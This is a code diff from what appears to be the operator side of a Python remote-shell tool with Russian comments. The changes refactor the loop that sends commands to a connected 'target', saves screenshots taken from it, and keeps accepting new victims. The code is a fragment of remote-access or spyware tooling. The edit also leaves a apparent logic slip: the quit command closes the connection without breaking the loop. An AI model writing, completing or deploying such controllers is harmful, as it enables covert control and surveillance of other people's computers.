@@ -78,7 +78,6 @@ def save_screenshot(target, screenshot_id):
         logging.error(f"Ошибка сохранения скриншота: {e}")
 
 
-# Работа с удаленной оболочкой
 def shell(target, ip):
     screenshot_id = 1
     while True:
@@ -88,7 +87,6 @@ def shell(target, ip):
             if command == "q":
                 target.close()
                 logging.info("[+] Сервер и клиент закрыты.")
-                break
             elif command == "help":
                 show_help()
             elif command.startswith("cd"):
@@ -106,13 +104,13 @@ def shell(target, ip):
                 print(response)
         except Exception as e:
             logging.error(f"Ошибка выполнения команды: {e}")
+            break
 
-def signal_handler(sig, frame):
-    logging.info("\n[!] Сервер остановлен вручную")
-    sys.exit(0)
 
-# подключение и прослушивание
 def server():
+    def signal_handler(sig, frame):
+        logging.info("\n[!] Сервер остановлен вручную")
+        sys.exit(0)
     signal.signal(signal.SIGINT, signal_handler)
     while True:
         try:
@@ -126,7 +124,7 @@ def server():
                 shell(target, ip)
         except Exception as e:
             logging.error(f"[!!] Критическая ошибка: {e}")
-            break
+            continue
 
 
 if __name__ == "__main__":
